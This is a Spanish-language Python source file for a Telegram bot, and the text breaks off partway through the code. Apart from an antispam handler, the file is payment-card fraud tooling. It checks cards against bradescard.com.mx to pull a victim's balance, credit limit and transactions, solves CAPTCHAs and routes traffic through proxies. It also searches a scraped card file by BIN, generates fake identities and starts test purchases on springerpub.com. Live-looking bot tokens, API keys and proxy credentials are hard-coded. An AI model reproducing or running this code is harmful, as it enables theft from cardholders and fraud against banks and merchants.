from turtle import st
import requests
import asyncio
import os
import threading
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, CallbackContext
from faker import Faker
import random

import globals
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import globals 
import requests
import random
import string
import secrets
from faker import Faker
import asyncio
from playwright.async_api import async_playwright
import globals

import asyncio
import threading
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
fake = Faker()
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import email
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper

from curl_cffi import requests
from fake_useragent import UserAgent





# Configuración del bot de Telegram
TOKEN_ID = "7975654740:AAEBwtrpnX2lP381_tLv4nybMpcVP0ryZlM"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN_ID}/sendMessage"
import unicodedata



import random
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from curl_cffi import requests
from tools import Tools
from telegram import Bot
from telegram.ext import Application
from turtle import st
import requests
import asyncio
import os
import threading

from telegram import Update
from telegram.ext import Application, MessageHandler, filters, CallbackContext
from faker import Faker
import random

import globals
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import globals 
import requests
import random
import string
import secrets
from faker import Faker
import asyncio

import globals

import threading
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
fake = Faker()
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Inicializar el bot con el token
bot = Bot(token="7975654740:AAEBwtrpnX2lP381_tLv4nybMpcVP0ryZlM")
application = Application.builder().token("7975654740:AAEBwtrpnX2lP381_tLv4nybMpcVP0ryZlM").build()


import time
from collections import defaultdict
from telegram import Update, ChatMember
from telegram.ext import ContextTypes, MessageHandler, filters

# Configuración antispam
MAX_MESSAGES = 5        # Número máximo de mensajes
TIME_WINDOW = 10        # Ventana de tiempo (segundos)
BLOCK_SPAMMERS = True   # Banear spammers si es True
PROTECT_LINKS = True    # Eliminar mensajes con enlaces

# Historial de mensajes por usuario
user_message_times = defaultdict(list)

# Función para verificar si un miembro es admin
async def is_admin(chat, user_id, context):
    try:
        member = await context.bot.get_chat_member(chat.id, user_id)
        return member.status in [ChatMember.ADMINISTRATOR, ChatMember.OWNER]
    except Exception as e:
        print(f"[ERROR] Verificando admin: {e}")
        return False

# Función antispam principal
async def antispam_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    user = update.effective_user
    chat = update.effective_chat

    if chat.type not in ["group", "supergroup"]:
        return  # Solo aplicar en grupos

    user_id = user.id
    now = time.time()

    # Omitir admins
    if await is_admin(chat, user_id, context):
        return

    # Verificación de links (si está activado)
    if PROTECT_LINKS:
        texto = message.text or ""
        if "http://" in texto or "https://" in texto or "t.me/" in texto:
            await message.delete()
            await message.reply_text(
                f"🔗 @{user.username or user.first_name}, los enlaces no están permitidos.",
                quote=True
            )
            return

    # Registro de mensajes recientes
    user_message_times[user_id].append(now)
    user_message_times[user_id] = [
        t for t in user_message_times[user_id] if now - t < TIME_WINDOW
    ]

    if len(user_message_times[user_id]) > MAX_MESSAGES:
        try:
            await message.delete()
            await message.reply_text(
                f"🚫 @{user.username or user.first_name}, por favor evita hacer spam.",
                quote=True
            )
            if BLOCK_SPAMMERS:
                await context.bot.ban_chat_member(chat.id, user_id)
                await context.bot.send_message(
                    chat_id=chat.id,
                    text=f"❌ Usuario @{user.username or user.first_name} fue expulsado por spam."
                )
        except Exception as e:
            print(f"[ERROR] al manejar spam: {e}")


import asyncio
import json
import requests
import re
from concurrent.futures import ThreadPoolExecutor

# Para refactorizar contenido
def procesar_contenido1(contenido):
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        contenido = contenido.replace(KEY, "|").replace(" ", "|")
    
    match = re.search(r'\d{16}', contenido)
    if not match:
        return None
    else:
        cc_number = match.group()  # Extraer los primeros 16 dígitos
        return cc_number

# Resolver Captcha de forma asincrónica
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')

# Función principal para procesar la tarjeta
import asyncio
import requests
import re
import json

async def brades(datos, chat_id):
    anti_captcha_api_key = 'cac59a01c519254119599acd1084d7c4'
    sitekey = '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn'
    url_destino = 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3'
    if isinstance(datos, list) and len(datos) == 4:
        cc_number, mes, ano, cvv = datos
    else:
        raise ValueError(f"Formato incorrecto de datos: {datos}")
    

    try:
        # Resolver CAPTCHA
        anticapt = await resolver_captcha(anti_captcha_api_key, sitekey, url_destino)

        host = "geo.iproyal.com"
        port = "51250"
        user = "rTPt8eauWJNOjdno"
        password = "BUo3nBhOfK3TV3vt_country-mx"

        
        proxy_url = f"http://{user}:{password}@{host}:{port}"

        proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

        s = requests.Session()
        s.proxies.update(proxies)        
        
        # Enviar solicitud de verificación de tarjeta
        try:
            response = await asyncio.to_thread(s.post, 'https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta', data={
                "token": anticapt,
                "tarjeta": cc_number,
                "terminos": True
            }, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
        except Exception as e:
            return f"⚠️ Error en la solicitud de verificación de tarjeta: {str(e)}"

        if "No se pudo verificar la tarjeta" in response.text or "success\":false" in response.text:
            return "🚫 No se pudo verificar la tarjeta. Intenta más tarde."

        # Obtener número de tarjeta del cliente
        try:
            response = await asyncio.to_thread(s.get, 'https://www.bradescard.com.mx/bradescard.net/', headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
            numerotarjetacliente = re.search(r"numerotarjetacliente: '([^']+)'", response.text)
            numerotarjetacliente = numerotarjetacliente.group(1) if numerotarjetacliente else "Desconocido"
        except Exception as e:
            return f"⚠️ Error al obtener número de tarjeta: {str(e)}"

        # Consultar detalles de tarjeta
        try:
            response = await asyncio.to_thread(s.post, "https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea", params={
                "numerotarjetacliente": numerotarjetacliente,
            }, headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            })
            card_data = response.json()
        except Exception as e:
            return f"⚠️ Error al obtener datos de la tarjeta: {str(e)}"

        # Extraer datos con valores predeterminados
        disponible_compras = card_data.get("DisponibleComprasPersona", "No disponible")
        pago_minimo = card_data.get("PagoMinimoPersona", "No disponible")
        saldo_total = card_data.get("SaldoTotalPersona", "No disponible")
        pago_total_mes = card_data.get("PagoTotalMesPersona", "No disponible")
        limite_credito = card_data.get("LimiteCreditoPersona", "No disponible")
        fecha_limite_pago = card_data.get("FechaLimitePagoPersona", "No disponible")
        fecha_corte = card_data.get("FechaCortePersona", "No disponible")

        # Consultar movimientos antes de corte
        try:
            response = await asyncio.to_thread(s.post, "https://www.bradescard.com.mx/bradescard.net/MasterPage/ConsultaDatosMovimientosAntesCorte", data={
                "NumeroTarjeta": numerotarjetacliente, "periodo": "0"
            }, headers={
                "Host": "www.bradescard.com.mx",
                "Origin": "https://www.bradescard.com.mx/",
                "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            })
            card_data = response.json()
        except Exception as e:
            return f"⚠️ Error al obtener movimientos: {str(e)}"

        # Procesar movimientos
        movimientos_output = ""
        if not card_data.get('status', True):
            movimientos_output = "🚫 No existen movimientos registrados."
        else:
            movimientos = json.loads(card_data.get("movimientos", "[]"))
            if not movimientos:
                movimientos_output = "🚫 No existen movimientos registrados."
            else:
                for item in movimientos:
                    if 'FechaRegistro' in item:
                        movimientos_output += f"📅 Fecha: {item['FechaRegistro']}\n💰 Monto: ${item['Monto']} MXN\n📌 Descripción: {item['Descripcion']}\n"
                        movimientos_output += "━━━━━━━━━━━━━━\n"

        # Formatear respuesta final
        result = f'''
💳 Tarjeta ➜ {cc_number+"|"+mes+"|"+ano+"|"+cvv} 
💰 Pago Mínimo ➜ {pago_minimo}  
📅 Pago Del Mes ➜ {pago_total_mes}  
💵 Total/Pago ➜ {saldo_total}  
💳 Límite de Crédito ➜ {limite_credito}  
⏳ Fecha Límite Pago ➜ {fecha_limite_pago}  
📆 Fecha de Corte ➜ {fecha_corte}  
🛒 Disponible para Compras ➜ {disponible_compras}  

━━━━━ Movimientos ━━━━━\n{movimientos_output}
'''
        return result

    except Exception as e:
        return f'❌ Error inesperado: {str(e)}'
    


async def bra(datos, chat_id):
    anti_captcha_api_key = 'cac59a01c519254119599acd1084d7c4'
    sitekey = '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn'
    url_destino = 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3'
    if isinstance(datos, list) and len(datos) == 4:
        cc_number, mes, ano, cvv = datos
    else:
        raise ValueError(f"Formato incorrecto de datos: {datos}")
    

    try:
        # Resolver CAPTCHA
        anticapt = await resolver_captcha(anti_captcha_api_key, sitekey, url_destino)

        host = "geo.iproyal.com"
        port = "51250"
        user = "rTPt8eauWJNOjdno"
        password = "BUo3nBhOfK3TV3vt_country-mx"

        
        proxy_url = f"http://{user}:{password}@{host}:{port}"

        
        proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

        
        s = requests.Session()
        s.proxies.update(proxies)        
        # Enviar solicitud de verificación de tarjeta
        try:
            response = await asyncio.to_thread(s.post, 'https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta', data={
                "token": anticapt,
                "tarjeta": cc_number,
                "terminos": True
            }, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
        except Exception as e:
            return f"⚠️ Error en la solicitud de verificación de tarjeta: {str(e)}"

        if "No se pudo verificar la tarjeta" in response.text or "success\":false" in response.text:
            return "🚫 No se pudo verificar la tarjeta. Intenta más tarde."

        # Obtener número de tarjeta del cliente
        try:
            response = await asyncio.to_thread(s.get, 'https://www.bradescard.com.mx/bradescard.net/', headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
            numerotarjetacliente = re.search(r"numerotarjetacliente: '([^']+)'", response.text)
            numerotarjetacliente = numerotarjetacliente.group(1) if numerotarjetacliente else "Desconocido"
        except Exception as e:
            return f"⚠️ Error al obtener número de tarjeta: {str(e)}"

        # Consultar detalles de tarjeta
        try:
            response = await asyncio.to_thread(s.post, "https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea", params={
                "numerotarjetacliente": numerotarjetacliente,
            }, headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            })
            card_data = response.json()
        except Exception as e:
            return f"⚠️ Error al obtener datos de la tarjeta: {str(e)}"

        # Extraer datos con valores predeterminados
        disponible_compras = card_data.get("DisponibleComprasPersona", "No disponible")
        pago_minimo = card_data.get("PagoMinimoPersona", "No disponible")
        saldo_total = card_data.get("SaldoTotalPersona", "No disponible")
        pago_total_mes = card_data.get("PagoTotalMesPersona", "No disponible")
        limite_credito = card_data.get("LimiteCreditoPersona", "No disponible")
        fecha_limite_pago = card_data.get("FechaLimitePagoPersona", "No disponible")
        fecha_corte = card_data.get("FechaCortePersona", "No disponible")

        # Consultar movimientos antes de corte

        # Formatear respuesta final
        result = f'''
💳 Tarjeta ➜ {cc_number+"|"+mes+"|"+ano+"|"+cvv} 
💰 Pago Mínimo ➜ {pago_minimo}  
📅 Pago Del Mes ➜ {pago_total_mes}  
💵 Total/Pago ➜ {saldo_total}  
💳 Límite de Crédito ➜ {limite_credito}  
⏳ Fecha Límite Pago ➜ {fecha_limite_pago}  
📆 Fecha de Corte ➜ {fecha_corte}  
🛒 Disponible para Compras ➜ {disponible_compras}  

'''
        return result

    except Exception as e:
        return f'❌ Error inesperado: {str(e)}'

import logging
import random
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from faker import Faker

# Configurar Faker en español y para México
fake = Faker("es_MX")

# Conjunto para almacenar datos generados y evitar repeticiones
generated_data = set()

# Lista de dominios de correo
email_domains = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "protonmail.com"]

# Prefijos de teléfonos en México (CDMX, Guadalajara, Monterrey, etc.)
phone_prefixes = ["55", "81", "33", "656", "998", "444", "222", "999", "871", "229"]

# Configurar logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

def generar_telefono():
    """Genera un número de teléfono de 10 dígitos válido para México."""
    prefix = random.choice(phone_prefixes)  # Seleccionar un prefijo válido
    remaining_digits = "".join(random.choices("0123456789", k=10 - len(prefix)))  # Completar con dígitos aleatorios
    return prefix + remaining_digits

async def datos(update: Update, context: CallbackContext) -> None:
    """Genera y envía datos aleatorios únicos."""
    while True:
        nombre = fake.first_name()
        apellido = fake.last_name()
        direccion = fake.address().replace("\n", ", ")
        ciudad = fake.city()
        telefono = generar_telefono()  # Llamada a la función para generar teléfono
        codigo_postal = fake.postcode()

        # Generar correo con dominio aleatorio
        correo_usuario = f"{nombre.lower()}.{apellido.lower()}{random.randint(1, 99)}"
        correo = f"{correo_usuario}@{random.choice(email_domains)}"

        # Crear un identificador único con los datos generados
        unique_entry = f"{nombre} {apellido} - {direccion} - {correo} - {ciudad} - {telefono} - {codigo_postal}"

        # Verificar si los datos ya existen
        if unique_entry not in generated_data:
            generated_data.add(unique_entry)
            break

    # Enviar mensaje con los datos generados
    mensaje = (
        f"👤 Nombre: {nombre} {apellido}\n"
        f"🏠 Dirección: {direccion}\n"
        f"📧 Correo: {correo}\n"
        f"🌆 Ciudad: {ciudad}\n"
        f"📞 Teléfono: {telefono}\n"
        f"📮 Código Postal: {codigo_postal}"
    )

    await update.message.reply_text(mensaje)
import asyncio
import aiofiles
import random
from telegram import Update
from telegram.ext import CallbackContext
async def extra(update: Update, context: CallbackContext) -> None:
    # Verificar si se proporcionó un argumento en el comando
    if context.args:
        search_number = context.args[0]  # Ejemplo: "426807"
        if not search_number.isdigit() or len(search_number) != 6:
            await update.message.reply_text("Por favor, proporciona un número válido de 6 dígitos. Ejemplo: /extra 426807")
            return
    else:
        await update.message.reply_text("Por favor, proporciona un número para buscar. Ejemplo: /extra 426807")
        return

    # Enviar un mensaje inicial mientras se procesan los datos
    processing_message = await update.message.reply_text("🔍 Buscando extras...")

    try:
        # Leer el archivo scraper.txt
        async with aiofiles.open("scraper.txt", mode="r") as file:
            lines = await file.readlines()

        # Filtrar las líneas que comiencen con el número proporcionado y cuya fecha de expiración sea >= 2025
        matching_lines = []
        for line in lines:
            try:
                # Dividir la línea por "|"
                parts = line.strip().split('|')
                if len(parts) >= 4:  # Validar que la línea tenga al menos 4 partes
                    card_number = parts[0]
                    month = int(parts[1])  # Mes (MM)
                    year = int(parts[2])  # Año (YYYY o AA)

                    # Convertir años de 2 dígitos a 4 dígitos si es necesario
                    year = year + 2000 if year < 100 else year

                    # Validar que la tarjeta comience con los 6 dígitos y que el año sea >= 2025
                    if card_number.startswith(search_number) and year >= 2025:
                        matching_lines.append(line.strip())
            except (IndexError, ValueError):
                # Ignorar líneas que no tienen un formato válido
                continue

        # Eliminar duplicados
        matching_lines = list(set(matching_lines))

        # Seleccionar aleatoriamente hasta 5 resultados
        if len(matching_lines) > 5:
            results_to_return = random.sample(matching_lines, 5)
        else:
            results_to_return = matching_lines

        # Enviar el mensaje con los resultados si se encontraron
        if results_to_return:
            results_message = "\n".join(results_to_return)
            await processing_message.edit_text(f"𝑬𝑿𝑻𝑹𝑨𝑺 𝑽𝟏 𝑲𝑼𝑹𝑰𝒀𝑨𝑴𝑨\n ────Detalles────\n\n{results_message}")
        else:
            # Informar que no se encontraron resultados
            await processing_message.edit_text(f"No se encontraron coincidencias para el número {search_number} con una fecha de expiración válida (>= 2025).")

    except FileNotFoundError:
        await processing_message.edit_text("El archivo scraper.txt no se encontró.")
    except Exception as e:
        await processing_message.edit_text(f"Ocurrió un error al procesar la solicitud: {e}")

# Función para ejecutar múltiples trabajos en hilos
async def procesar_tarjetas(cc_numbers):
    tasks = [brades(cc_number) for cc_number in cc_numbers]
    return await asyncio.gather(*tasks)

from gen import process_message
import os
max_workers = min(32, (os.cpu_count() or 1) * 2)
executor = ThreadPoolExecutor(max_workers=max_workers)
async def gen(update: Update, context: CallbackContext):
    
        message = update.message.text
        cleaned_string = message.replace("/gen ", "")
        
        # Ejecutar la tarea en un hilo y esperar el resultado
        result = await asyncio.get_event_loop().run_in_executor(executor, process_message, cleaned_string)
        
        await update.message.reply_text(result)







import requests
import random
from tools import Tools  # Asegúrate de tener esta clase definida correctamente

import aiohttp, uuid, traceback, asyncio, ssl, requests
from aiohttp_socks.connector import ProxyConnector

class Payflow:

    def __init__(self,cc, mes, ano, cvv, session=None):
        proxy_host = "gw.dataimpulse.com"
        proxy_port = "823"
        proxy_user = "936ae65a96c35f36082e"
        proxy_pass = "4084e8a942ac8803"
        self.proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

        # Usar sesión externa o crear una nueva con proxy
        self.session = session
        self.cc = cc
        self.mes = mes
        self.ano = ano
        self.cvv = cvv
        self.email = str(uuid.uuid4())[:8]+"@gmail.com"
    
    
    @staticmethod
    async def RandomUserUS():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://randomuser.me/api/1.2/?nat=US") as response:
                    user = await response.text()
                    street = user.split('"street":"')[1].split('"')[0]
                    city = user.split('"city":"')[1].split('"')[0]
                    state1 = user.split('"state":"')[1].split('"')[0]
                    zipcode = user.split('"postcode":')[1].split(',')[0]
                    phone = user.split('"phone":"')[1].split('"')[0]
                    name = user.split('"first":"')[1].split('"')[0]
                    last = user.split('"last":"')[1].split('"')[0]

                    state_mappings = {
                        "Alabama": "AL", "Alaska": "AK", "Arizona": "AZ", "Arkansas": "AR",
                        "California": "CA", "Colorado": "CO", "Connecticut": "CT", "Delaware": "DE",
                        "Florida": "FL", "Georgia": "GA", "Hawaii": "HI", "Idaho": "ID",
                        "Illinois": "IL", "Indiana": "IN", "Iowa": "IA", "Kansas": "KS",
                        "Kentucky": "KY", "Louisiana": "LA", "Maine": "ME", "Maryland": "MD",
                        "Massachusetts": "MA", "Michigan": "MI", "Minnesota": "MN", "Mississippi": "MS",
                        "Missouri": "MO", "Montana": "MT", "Nebraska": "NE", "Nevada": "NV",
                        "New Hampshire": "NH", "New Jersey": "NJ", "New Mexico": "NM", "NY": "NY",
                        "North Carolina": "NC", "North Dakota": "ND", "Ohio": "OH", "Oklahoma": "OK",
                        "Oregon": "OR", "Pennsylvania": "PA", "Rhode Island": "RI", "South Carolina": "SC",
                        "South Dakota": "SD", "Tennessee": "TN", "Texas": "TX", "Utah": "UT",
                        "Vermont": "VT", "Virginia": "VA", "Washington": "WA", "West Virginia": "WV",
                        "Wisconsin": "WI", "Wyoming": "WY"
                    }

                    state = state_mappings.get(state1.capitalize(), "NY")

                    await session.close()
                    return street, city, state, zipcode, phone, name, last, state1
                
        except Exception as e:
            await session.close()
            street = "Street 342"
            city = "New York"
            state = "NY"
            zipcode = "10080"
            phone = "5515263214"
            name = "Jose"
            last = "Perez"
            state1 = "New York"
            return street, city, state, zipcode, phone, name, last, state1
        
        
    async def payflow_gate(self):
        try:
            street, city, state, zipcode, phone, name, last, state1 = await Payflow.RandomUserUS()
            
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.6',
                'priority': 'u=0, i',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            }

            response = self.session.get('https://www.springerpub.com/the-health-services-executive-hse-q-a-review-9780826135254.html', headers=headers)
            r1 = response.text

            with open("B3.html", "w", encoding="utf-8") as f:
                f.write(r1)

            form_key = r1.split('name="form_key" type="hidden" value="')[1].split('"')[0]

            cookies = {'form_key': form_key}

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryZaJoTVkecrdZLovC',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4NzIxNjAiLCJhcCI6IjE1ODkwMTQ2NTUiLCJpZCI6IjUzNDJhNDcwYzE2YzY3MmUiLCJ0ciI6IjVlNGQ0Zjk1YzNiNjhmYjhmOGU2OTYwNWI3YjRmOGExIiwidGkiOjE3NDQwNzYyMDkzNzR9fQ==',
                'origin': 'https://www.springerpub.com',
                'priority': 'u=1, i',
                'referer': 'https://www.springerpub.com/the-health-services-executive-hse-q-a-review-9780826135254.html',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'traceparent': '00-5e4d4f95c3b68fb8f8e69605b7b4f8a1-5342a470c16c672e-01',
                'tracestate': '4872160@nr=0-1-4872160-1589014655-5342a470c16c672e----1744076209374',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'x-newrelic-id': 'UA4AU1dVCBABUFhVAQcEVFUD',
                'x-requested-with': 'XMLHttpRequest',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'amzn-checkout-session={}; form_key={form_key}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-banners-cache-storage={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=c5dd03b4f3b0ca3e00956aa0d262df14; form_key={form_key}; wp_ga4_customerGroup=NOT%20LOGGED%20IN; __wtba=eyJwaSI6eyJuYW1lIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImNvdW50IjoxfSwicyI6W3sicCI6Ii8iLCJldCI6ImhvbWUiLCJ0IjoxNzQ0MDc2MTc5LjMxOH0seyJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsInQiOjE3NDQwNzYyMDUuMjIyfV0sInVpIjp7InQiOjE3NDQwNzYxNzkuMzA5LCJ1YSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInRtcHQiOiJNU1NYaHhpRENxUmpJTVk4bjVIcDB5dnpoYWc0S092UHVYQnFFcGloIn19',
            }
            
            data = f'------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="product"\r\n\r\n9475\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="selected_configurable_option"\r\n\r\n\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="related_product"\r\n\r\n\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="item"\r\n\r\n9475\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="form_key"\r\n\r\n{form_key}\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="super_attribute[395]"\r\n\r\n14038\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC\r\nContent-Disposition: form-data; name="qty"\r\n\r\n1\r\n------WebKitFormBoundaryZaJoTVkecrdZLovC--\r\n'


            response = self.session.post('https://www.springerpub.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuc3ByaW5nZXJwdWIuY29tL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbA~~/product/9475/', cookies=cookies, headers=headers, data=data)



            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://www.springerpub.com/the-health-services-executive-hse-q-a-review-9780826135254.html',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
